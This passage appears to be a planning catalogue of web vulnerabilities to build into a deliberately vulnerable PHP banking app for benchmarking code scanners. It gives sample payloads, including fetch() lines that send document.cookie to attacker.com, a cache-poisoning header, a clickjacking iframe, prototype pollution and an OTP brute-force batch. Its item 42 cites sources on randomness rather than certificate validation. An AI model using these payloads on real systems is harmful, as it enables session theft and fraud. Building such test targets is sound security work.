### Category 8 — HTTP-Level Attacks

**SAST difficulty: LOW-MEDIUM** (these are typically infrastructure/proxy configuration issues, but can be partially implemented in PHP middleware or gateway code).

---

**30. HTTP Request Smuggling (CL.TE / TE.CL)**
- **CWE-444** — Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')
- **Description:** Discrepancies between how a front-end proxy and a back-end PHP server interpret `Content-Length` vs. `Transfer-Encoding` headers allow an attacker to smuggle a hidden request that is processed as the beginning of the next victim's request.
- **Banking scenario:** A VulnBank environment with nginx as reverse proxy and PHP-FPM as backend. The attacker sends a request with both `Content-Length` and `Transfer-Encoding: chunked` headers in conflict, smuggling a partial `POST /admin/promote` request that is prepended to the next user's request.
- **Payload:** CL.TE smuggling: send body where CL says N bytes but the chunked encoding ends early, leaving a suffix poisoning the next request.
- **SAST difficulty:** LOW — this is primarily a network/server configuration issue, less a source code flaw; though the PHP code can implement deliberate ambiguity.

Sources: [HTTP Request Smuggling — portswigger.net (TE.CL lab)](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl), [HTTP Request Smuggling — beaglesecurity.com](https://beaglesecurity.com/blog/vulnerability/http-request-smuggling.html)

---

**31. Web Cache Poisoning via Unkeyed Header**
- **CWE-444** — Inconsistent Interpretation of HTTP Requests
- **Description:** A caching layer that stores responses keyed only on the URL but not on headers like `X-Forwarded-Host` or `X-Original-URL` allows poisoning: an attacker supplies a malicious header that the application reflects into the response, which is then served to other users from cache.
- **Banking scenario:** The bank's CDN caches `/dashboard`. An attacker sends `X-Forwarded-Host: attacker.com` and the PHP app generates a `<script src="https://attacker.com/app.js">` tag in the response. This poisoned response is cached and served to all users.
- **Payload:** Request to `/dashboard` with header `X-Forwarded-Host: attacker.com`, observe if the poisoned response is cached.
- **SAST difficulty:** LOW-MEDIUM — the PHP code flaw is using `$_SERVER['HTTP_X_FORWARDED_HOST']` to construct asset URLs without validation.

Sources: [Web Cache Poisoning vs Deception — payatu.com](https://payatu.com/blog/web-cache-poisoning-vs-deception-the-dynamic-duo-of-cache-attacks/), [Cache Poisoning — owasp.org](https://owasp.org/www-community/attacks/Cache_Poisoning), [Web Cache Deception — portswigger.net](https://portswigger.net/web-security/web-cache-deception)

---

**32. Web Cache Deception**
- **CWE-525** — Use of Web Browser Cache Containing Sensitive Information
- **Description:** A caching layer that caches URLs based on file extension will store authenticated user data if an attacker tricks a victim into accessing a URL like `/account/statement/fake.css`.
- **Banking scenario:** The bank uses a CDN with rules caching all `.css` and `.js` URLs. An attacker crafts `https://bank.com/account/transactions/statement.css`, tricks the victim into visiting it (social engineering), and the CDN caches the authenticated response. The attacker fetches the same URL unauthenticated to retrieve the victim's transaction history.
- **Payload:** Trick victim into visiting `https://bank.com/account/profile.css`; fetch same URL unauthenticated.
- **SAST difficulty:** LOW — difficult to detect from PHP source alone; requires knowing CDN caching rules.

Sources: [Web Cache Deception — portswigger.net](https://portswigger.net/web-security/web-cache-deception), [Cached and Confused — arxiv.org](https://arxiv.org/pdf/1912.10190)

---

**33. HTTP Parameter Pollution (HPP)**
- **CWE-235** — Improper Handling of Extra Parameters
- **Description:** Sending duplicate HTTP parameters exploits inconsistencies between how PHP and upstream WAFs or signature verifiers interpret which value takes precedence (PHP uses the last occurrence; many WAFs inspect only the first).
- **Banking scenario:** A transfer confirmation signature is verified on `amount=100` (first param, checked by WAF), but PHP processes `amount=9999` (last param), allowing the attacker to sign a $100 transfer that actually executes as $9,999.
- **Payload:** `POST /transfer?amount=100&amount=9999&to=attacker&sig=<valid_sig_for_100>`
- **SAST difficulty:** MEDIUM — scanner must know PHP's `$_GET` behavior for duplicate keys and contrast it with other layer behavior.

Sources: [HTTP Parameter Pollution — acunetix.com](https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/), [CWE-235 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/235.html), [OWASP Testing for HPP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)

---

### Category 9 — Client-Side Attacks (Beyond Basic XSS)

**SAST difficulty: HIGH.** These require understanding JavaScript execution context, DOM APIs, or framework-specific behaviors — not just PHP output encoding.

---

**34. DOM Clobbering**
- **CWE-79** — XSS via DOM Manipulation
- **Description:** HTML elements with `id` or `name` attributes can shadow global JavaScript variables; if the application uses `window.config` or `window.someVar` as a security-critical object, injecting `<a id="config" href="javascript:evil()">` overwrites it.
- **Banking scenario:** The banking dashboard reads `window.userConfig.csrf_token` to attach to AJAX requests. An attacker stores `<form id="userConfig"><input name="csrf_token" value="attacker-token"></form>` via a stored-content field, causing the CSRF token in all AJAX requests to be replaced.
- **Payload:** Store `<a id="userConfig" name="csrf_token">` via any HTML injection point.
- **SAST difficulty:** VERY HIGH — requires understanding the DOM API and how named HTML elements pollute the `window` namespace; not detectable from PHP code alone.

Sources: [DOM-Based Attacks: DOM Clobbering — lazyhackers.in](https://lazyhackers.in/article/dom-clobbering-mxss-client-side-template-injection), [DOM clobbering lab — medium.com/infosecmatrix](https://medium.com/infosecmatrix/18-6-lab-exploiting-dom-clobbering-to-enable-xss-640dd7c5fcf8)

---

**35. Client-Side Template Injection (CSTI)**
- **CWE-94** — Code Injection via Template Expression
- **Description:** If a JavaScript templating engine (AngularJS, Vue, Handlebars) is used on the page and user input is interpolated into the template without sanitization, template expressions can be injected to execute JavaScript even when server-side output is encoded.
- **Banking scenario:** The bank's front-end uses AngularJS. A transaction description field is rendered in the AngularJS scope as `{{description}}`. An attacker stores `{{constructor.constructor('alert(document.cookie)')()}}` as a description, which AngularJS evaluates as JavaScript.
- **Payload:** `{{7*7}}` to test; `{{constructor.constructor('fetch("https://attacker.com/?c="+document.cookie)')()}}` to exploit.
- **SAST difficulty:** HIGH — requires knowing that the PHP output is consumed by a JS template engine and that encoding is bypassed by template expression evaluation.

Sources: [Client Side Template Injection — acunetix.com](https://www.acunetix.com/vulnerabilities/web/client-side-template-injection/), [OWASP Testing for Client-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection), [DOM-Based Attacks including CSTI — lazyhackers.in](https://lazyhackers.in/article/dom-clobbering-mxss-client-side-template-injection)

---

**36. Clickjacking on Sensitive Action Pages**
- **CWE-1021** — Improper Restriction of Rendered UI Layers or Frames
- **Description:** Absence of `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers allows an attacker to embed the banking page in a transparent iframe and trick an authenticated user into clicking on overlaid fake UI elements.
- **Banking scenario:** `/transfer` page has no frame-busting headers. An attacker builds a page with a transparent iframe overlaid on a "Claim Free Gift" button, positioned so the victim's click lands on the transfer "Confirm" button, initiating a funds transfer.
- **Payload:** HTML page embedding `<iframe src="https://bank.com/transfer?to=attacker&amount=500" style="opacity:0.01;position:absolute;..."></iframe>`
- **SAST difficulty:** LOW-MEDIUM — detectable by scanning HTTP response headers in PHP code for missing header calls.

Sources: [Clickjacking — imperva.com](https://www.imperva.com/learn/application-security/clickjacking/), [Clickjacking Defense — owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [CWE-1021 — Dokploy advisory](https://github.com/Dokploy/dokploy/security/advisories/GHSA-c94j-8wgf-2q9q)

---

### Category 10 — API Security

**SAST difficulty: HIGH.** REST and GraphQL API vulnerabilities often involve authorization logic that must be evaluated per-field or per-resolver, not at a route level.

---

**37. GraphQL Introspection + Batch Query Abuse**
- **CWE-284** — Improper Access Control
- **Description:** GraphQL's introspection system, left enabled in production, exposes the entire API schema. Batch queries (or aliases) can be used to bypass rate limiting and brute-force 2FA codes.
- **Banking scenario:** `/graphql` exposes introspection. An attacker discovers a `verifyOTP(code: String)` mutation and sends a batched request with 10,000 aliases, each trying a different OTP code, bypassing the per-request rate limit.
- **Payload:** GraphQL batch: `{ a1: verifyOTP(code:"0000") a2: verifyOTP(code:"0001") ... a9999: verifyOTP(code:"9999") }`
- **SAST difficulty:** HIGH — requires understanding GraphQL resolver-level authorization and the rate-limiting bypass via aliasing.

Sources: [GraphQL API Vulnerabilities — imperva.com](https://www.imperva.com/blog/graphql-vulnerabilities-common-attacks/), [GraphQL Security from a Pentester's Perspective — afine.com](https://afine.com/graphql-security-from-a-pentesters-perspective), [GraphQL API Security Testing Guide — apisec.ai](https://www.apisec.ai/graphql-security-testing-guide)

---

**38. Broken Object Property Level Authorization (BOPLA) in API**
- **CWE-213** — Exposure of Sensitive Information Due to Incompatible Policies
- **Description:** An API that returns all object properties without filtering sensitive ones based on the caller's role exposes data that should be access-controlled at the field level, not just the route level.
- **Banking scenario:** `GET /api/accounts/42` is protected (requires auth), but the response JSON includes `{"id":42,"balance":5000,"internal_credit_score":720,"admin_notes":"flagged for review"}`. Regular users should not see `internal_credit_score` or `admin_notes`.
- **Payload:** Authenticate as a regular user and call `GET /api/accounts/42`; observe sensitive fields in the response.
- **SAST difficulty:** HIGH — requires understanding which fields are sensitive and verifying per-field access control, not just endpoint-level auth checks.

Sources: [BOLA deep dive — hadrian.io](https://hadrian.io/blog/insecure-direct-object-reference-idor-a-deep-dive), [GraphQL API Vulnerabilities and BOLA — imperva.com](https://www.imperva.com/blog/graphql-vulnerabilities-common-attacks/)

---

### Category 11 — Prototype Pollution (JS / Server-Side)

**SAST difficulty: VERY HIGH.** Requires understanding JavaScript's prototype chain and how polluted properties propagate through library calls.

---

**39. Server-Side Prototype Pollution (Node.js API Gateway)**
- **CWE-1321** — Improperly Controlled Modification of Object Prototype Attributes
- **Description:** An API endpoint that merges user-supplied JSON into an object using an unsafe deep-merge function allows injection of `__proto__` properties that pollute `Object.prototype`, affecting all subsequent objects.
- **Banking scenario:** VulnBank's Node.js API gateway has an endpoint `POST /api/preferences` that merges `req.body` into `userPrefs` using a vulnerable `_.merge()`. An attacker sends `{"__proto__":{"isAdmin":true}}`, polluting all objects so `userPrefs.isAdmin` returns `true` globally.
- **Payload:** `POST /api/preferences` with body `{"__proto__":{"isAdmin":true}}`
- **SAST difficulty:** VERY HIGH — requires understanding that `__proto__` assignment via a JSON key traverses the prototype chain, a deep JavaScript semantic not apparent from syntax alone.

Sources: [Server-side prototype pollution — portswigger.net](https://portswigger.net/web-security/prototype-pollution/server-side), [Silent Spring: Prototype Pollution Leads to RCE — arxiv.org](https://arxiv.org/pdf/2207.11171), [CWE-1321 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/1321.html)

---

### Category 12 — Supply Chain / Dependency Confusion

**SAST difficulty: LOW** (not a source code pattern; a build/registry configuration issue — but valuable as a training signal for LLM scanners evaluating `composer.json` / `package.json`).

---

**40. Dependency Confusion / Package Namespace Hijacking**
- **CWE-427** — Uncontrolled Search Path Element
- **Description:** If a private internal package name (e.g., `bankinternal/statements-sdk`) is published to a public registry (Packagist, npm) with a higher version number, the package manager resolves the public malicious version instead of the private one.
- **Banking scenario:** VulnBank uses a private Composer package `vulnbank/core-lib` hosted on a private Satis repo. An attacker publishes `vulnbank/core-lib v9.9.9` to public Packagist. A developer running `composer update` without strict repository pinning installs the malicious public version.
- **Payload:** Publish a malicious package to Packagist with the same name as the private internal package but a higher semantic version number.
- **SAST difficulty:** LOW — detectable by checking `composer.json` for missing `repositories` pinning or missing `"only"` constraint on private repos.

Sources: [Dependency Confusion — aquasec.com](https://www.aquasec.com/cloud-native-academy/supply-chain-security/dependency-confusion/), [Preventing Dependency Hijacking — blog.packagist.com](https://blog.packagist.com/preventing-dependency-hijacking/), [Malicious npm packages abuse dependency confusion — microsoft.com](https://www.microsoft.com/en-us/security/blog/2026/05/29/33-malicious-npm-packages-abuse-dependency-confusion-profile-developer-environments/)

---

### Category 13 — Additional / Miscellaneous

---

**41. Insecure Cookie Attributes (Missing `HttpOnly`, `Secure`, `SameSite`)**
- **CWE-1004** — Sensitive Cookie Without `HttpOnly` Flag
- **Description:** Session cookies lacking `HttpOnly` are readable by JavaScript (enabling XSS-based session theft); lacking `Secure` they are transmitted over HTTP; lacking `SameSite=Strict` they are sent in cross-origin requests.
- **Banking scenario:** `setcookie('PHPSESSID', $sid)` without `httponly=true` allows any XSS payload to exfiltrate the session cookie via `document.cookie`.
- **Payload:** In any XSS context: `fetch('https://attacker.com/c?'+document.cookie)`
- **SAST difficulty:** LOW-MEDIUM — detectable by scanning `setcookie()` calls for missing flags.

Sources: [CWE-1004 — cve.mitre.org](https://cwe.mitre.org/data/definitions/1004.html), [Clickjacking Defense Cheat Sheet — owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

---

**42. Improper Certificate Validation / TLS Verification Disabled**
- **CWE-295** — Improper Certificate Validation
- **Description:** PHP cURL calls with `CURLOPT_SSL_VERIFYPEER = false` or `CURLOPT_SSL_VERIFYHOST = 0` disable TLS certificate validation, enabling man-in-the-middle attacks on outbound bank-to-bank or bank-to-payment-processor connections.
- **Banking scenario:** `curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false)` is used in the payment processor integration for convenience in testing and never reverted in production.
- **Payload:** MitM the TLS connection between VulnBank and the payment gateway; intercept and modify transaction data.
- **SAST difficulty:** LOW — scanner can flag `CURLOPT_SSL_VERIFYPEER` set to `false` directly.

Sources: [Security Basics — owasp.org](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness), [Insecure Random Number Generation — sourcery.ai](https://www.sourcery.ai/vulnerabilities/insecure-random-number-generation)

---

**43. Verbose Error Disclosure / Stack Trace Leakage**
- **CWE-209** — Generation of Error Message Containing Sensitive Information
- **Description:** PHP configured with `display_errors = On` and `error_reporting = E_ALL` exposes full stack traces, DB query strings, file paths, and credentials in HTTP responses.
- **Banking scenario:** A malformed SQL query triggers a MySQL error that includes the connection string `mysql://root:bankpass@db:3306/accounts` in the response body.
- **Payload:** Submit malformed input to any DB-touching endpoint; observe error output containing credentials or internal paths.
- **SAST difficulty:** LOW — detectable by checking `php.ini` or `ini_set('display_errors', 1)` in code.

Sources: [Security Misconfig — owasp.org OWASP Top 10 A05](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

---

## Trade-offs / Caveats

- **PHAR deserialization (item 3) vs. PHP unserialize() (already implemented):** These are distinct attack vectors. The already-implemented vulnerability uses explicit `unserialize()` calls; PHAR deserialization triggers deserialization implicitly via filesystem functions with no `unserialize()` in the source — making it far harder for SAST to detect. Ensure the implementation demonstrates this distinction by not including any explicit `unserialize()` call.

- **Second-order SQL injection (item 23) vs. basic SQLi (already implemented):** The exclusion list covers basic SQL injection. Second-order SQLi requires a DB round-trip between storage and use, making it a genuinely different class even though the underlying CWE is the same (CWE-89). Recommend implementing this as a distinct scenario.

- **Prototype pollution (item 39)** is native to JavaScript/Node.js and has no direct PHP equivalent. If VulnBank is purely PHP, this requires a Node.js API gateway component. The PHP analog is CWE-915 mass assignment via `extract()` (item 2), which is already listed separately.

- **HTTP request smuggling (item 30) and web cache poisoning (items 31–32)** are primarily infrastructure/proxy configuration issues and require a reverse proxy (nginx, Apache) in front of PHP to be exploitable. They are better benchmarks for DAST than SAST scanners; include if the goal includes infrastructure-level misconfigurations.

- **`preg_replace /e` modifier (item 4)** was removed in PHP 7.0. If VulnBank targets modern PHP (8.x), this needs to be implemented on a legacy PHP 5/6 endpoint explicitly, or documented as a PHP-version-specific scenario.

- **Null byte injection (item 5)** is patched in PHP >= 5.3.4. Same caveat: requires deliberate use of old PHP version or a custom C extension that reintroduces the behavior.

- **Several business logic flaws (items 12–16)** have the same root CWE (CWE-20 or CWE-840) but manifest as entirely different attack scenarios. Each should be implemented as a separate endpoint/feature to give scanners distinct code patterns to evaluate.

- All source dates: items 30–32 (HTTP smuggling, cache poisoning) were most thoroughly researched and published 2019–2022; the techniques remain valid in 2026 but the specific server/CDN configuration details evolve. PortSwigger Web Security Academy labs for these are continuously updated.

---

## Sources

- [PHP Type Juggling — kecman.co](https://kecman.co/blog/php-type-juggling-authentication-bypass.html) — authentication bypass via `0e` magic hashes and loose comparison
- [PHP Type Juggling — vickieli.dev](https://vickieli.dev/insecure%20deserialization/php-type-juggling/) — comprehensive overview of juggling attack surface
- [Auth Bypass with PHP Type Juggling — cybernetgen.com](https://cybernetgen.com/blog/auth-bypass-with-php-type-juggling) — practical exploitation steps
- [Critical Flaw in PHP's extract() — gbhackers.com](https://gbhackers.com/critical-flaw-in-phps-extract-function/) — extract() memory corruption and variable overwrite
- [Mass Assignment in PHP — secureflag.com](https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/mass_assignment_php.html) — CWE-915 in PHP context
- [Mass Assignment CWE-915 — hacktricks.wiki](https://hacktricks.wiki/en/pentesting-web/mass-assignment-cwe-915.html) — exploitation techniques
- [OWASP API Security — Mass Assignment](https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/) — OWASP API Top 10 A6 definition
- [How to exploit PHAR deserialization — pentest-tools.com](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability) — complete PHAR attack chain
- [File Operation Induced Unserialization via phar:// — Black Hat 2018](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf) — original research paper distinguishing PHAR from unserialize
- [Phar Deserialization leads to RCE — hackmd.io](https://hackmd.io/@winky/Skof1Ljwxl) — step-by-step lab walkthrough
- [PHP Code Execution via preg_replace /e — github.com/pear](https://github.com/pear/pearweb/security/advisories/GHSA-vhw6-hqh9-8r23) — real advisory for /e modifier RCE
- [PHP rfc: remove_preg_replace_eval_modifier — wiki.php.net](https://wiki.php.net/rfc/remove_preg_replace_eval_modifier) — official RFC documenting the removal
- [Null byte injection in PHP — infosecinstitute.com](https://www.infosecinstitute.com/resources/secure-coding/null-byte-injection-php/) — PHP null byte exploitation
- [CWE-626 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/626.html) — Poison Null Byte CWE definition
- [From LFI to LFD: Exploiting PHP Wrappers — medium.com/@zoningxtr](https://medium.com/@zoningxtr/from-lfi-to-lfd-exploiting-php-wrappers-to-steal-sensitive-data-like-a-pro-%EF%B8%8F-%EF%B8%8F-ec7385b49ea1) — php://filter chain exploitation
- [JWT Algorithm Confusion — aquilax.ai](https://aquilax.ai/blog/jwt-algorithm-confusion-auth-bypass) — none and RS256→HS256 attack explanation
- [JWT Algorithm Confusion Attacks — workos.com](https://workos.com/blog/jwt-algorithm-confusion-attacks) — library history and prevention
- [CWE-347 Remediation — dipsylala.github.io](https://dipsylala.github.io/FlawFixingGuidance/CWE-347/) — improper signature verification definition
- [OAuth Misconfiguration Vulnerabilities — blog.intelligencex.org](https://blog.intelligencex.org/oauth-misconfiguration-vulnerabilities-attacks-prevention-guide) — state parameter and redirect URI flaws
- [Common OAuth Vulnerabilities — doyensec.com](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html) — January 2025 comprehensive OAuth flaw catalog
- [Basic password reset poisoning — medium.com](https://medium.com/@sakibahamed007/writeup-portswigger-academy-basic-password-reset-poisoning-217e4b5f9759) — Host header injection walkthrough
- [HTTP Host header attacks — attacker-codeninja.github.io](https://attacker-codeninja.github.io/2021-09-09-portswigger-notes-on-host-header-attack/) — full notes on host header attack surface
- [I Forgot Your Password: Randomness Attacks Against PHP — usenix.org](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final218.pdf) — foundational paper on PHP PRNG attacks (2012, still applicable)
- [php_mt_seed cracker — openwall.com](https://www.openwall.com/php_mt_seed/) — tool for cracking mt_rand seeds
- [Insecure Randomness — owasp.org](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness) — OWASP definition and impact
- [Password Reset Flaws — medium.com/@cybersphere.official](https://medium.com/@cybersphere.official/password-reset-flaws-the-easiest-account-takeover-vector-17f24f65d094) — enumeration and token prediction techniques
- [CWE-916 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/916.html) — insufficient hash work factor definition
- [CBC Padding Oracle Attacks — brunorochamoura.com](https://www.brunorochamoura.com/posts/cbc-padding-oracle/) — detailed attack walkthrough
- [ECB mode is insecure — docs.datadoghq.com](https://docs.datadoghq.com/security/code_security/static_analysis/static_analysis_rules/java-security/cipher-padding-oracle/) — ECB cipher padding oracle rules
- [SQL injection (second order) — portswigger.net](https://portswigger.net/kb/issues/00100210_sql-injection-second-order) — PortSwigger canonical definition
- [Web Security Series #9: Second-Order SQL Injection — medium.com](https://medium.com/@laibakashif0011/web-security-series-9-exploiting-second-order-sql-injection-via-stored-user-input-32b89387e86b) — exploitation walkthrough (March 2026)
- [Blind/Stored XSS in Admin Panel — octayus.medium.com](https://octayus.medium.com/discovering-two-out-of-scope-blind-stored-xss-vulnerabilities-in-an-admin-panel-on-a-public-bug-c0262fa35238) — real bug bounty report
- [Authentication bypass via MongoDB operator injection — invicti.com](https://www.invicti.com/web-application-vulnerabilities/authentication-bypass-via-mongodb-operator-injection) — NoSQL injection mechanics
- [CWE-943 — github.com/securitylab](https://github.com/github/securitylab/issues/342) — CWE-943 NoSQL injection query definition
- [LDAP Injection CWE-90 — immuniweb.com](https://www.immuniweb.com/vulnerability/ldap-injection.html) — LDAP injection definition and impact
- [CWE-90 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/90.html) — official CWE definition
- [Email Header Injection — researchgate.net](https://www.researchgate.net/publication/315327239_E-mail_Header_Injection_Vulnerabilities) — academic paper on PHP mail() injection
- [Billion laughs attack — wikipedia.org](https://en.wikipedia.org/wiki/Billion_laughs_attack) — exponential entity expansion overview
- [Out-of-Band XXE — invicti.com](https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe) — OOB XXE definition and exfiltration mechanics
- [Blind XXE — portswigger.net](https://portswigger.net/web-security/xxe/blind) — PortSwigger lab and tutorial
- [HTTP Request Smuggling TE.CL lab — portswigger.net](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl) — PortSwigger canonical lab
- [Web Cache Poisoning vs Deception — payatu.com](https://payatu.com/blog/web-cache-poisoning-vs-deception-the-dynamic-duo-of-cache-attacks/) — comparison of both attack types
- [Web Cache Deception — portswigger.net](https://portswigger.net/web-security/web-cache-deception) — PortSwigger canonical definition
- [Cached and Confused — arxiv.org](https://arxiv.org/pdf/1912.10190) — academic research on cache deception in the wild (2019)
- [HTTP Parameter Pollution — acunetix.com](https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/) — HPP whitepaper
- [CWE-235 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/235.html) — Improper Handling of Extra Parameters
- [DOM-Based Attacks: DOM Clobbering, mXSS, CSTI — lazyhackers.in](https://lazyhackers.in/article/dom-clobbering-mxss-client-side-template-injection) — combined client-side attack overview
- [Client Side Template Injection — acunetix.com](https://www.acunetix.com/vulnerabilities/web/client-side-template-injection/) — CSTI definition and AngularJS examples
- [OWASP Testing for CSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection) — OWASP WSTG guidance
- [Clickjacking Defense — owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) — OWASP cheat sheet
- [GraphQL API Vulnerabilities — imperva.com](https://www.imperva.com/blog/graphql-vulnerabilities-common-attacks/) — batching, introspection, BOLA
- [GraphQL Security from a Pentester's Perspective — afine.com](https://afine.com/graphql-security-from-a-pentesters-perspective) — depth and aliasing attacks
- [Server-side prototype pollution — portswigger.net](https://portswigger.net/web-security/prototype-pollution/server-side) — Node.js prototype pollution mechanics
- [Silent Spring: Prototype Pollution → RCE — arxiv.org](https://arxiv.org/pdf/2207.11171) — academic paper on RCE via prototype pollution
- [CWE-1321 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/1321.html) — Prototype Pollution official CWE
- [Dependency Confusion — aquasec.com](https://www.aquasec.com/cloud-native-academy/supply-chain-security/dependency-confusion/) — definition and mechanics
- [Preventing Dependency Hijacking — blog.packagist.com](https://blog.packagist.com/preventing-dependency-hijacking/) — Composer-specific mitigation
- [Malicious npm packages abuse dependency confusion — microsoft.com](https://www.microsoft.com/en-us/security/blog/2026/05/29/33-malicious-npm-packages-abuse-dependency-confusion-profile-developer-environments/) — active 2026 campaign (May 2026)
- [AVideo TOCTOU Race Condition CVE-2026-34368 — advisories.gitlab.com](https://advisories.gitlab.com/pkg/composer/wwbn/avideo/CVE-2026-34368/) — real PHP banking-style race condition CVE
- [CWE-362 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/362.html) — Race Condition official CWE
- [Business Logic Flaws — medium.com/@instatunnel](https://medium.com/@instatunnel/business-logic-flaws-the-vulnerabilities-no-scanner-can-find-b52d64692f4d) — scanner-evasion business logic overview
- [Business Logic Errors — book.jorianwoltjer.com](https://book.jorianwoltjer.com/other/business-logic-errors) — practical CTF-oriented treatment including rounding attacks
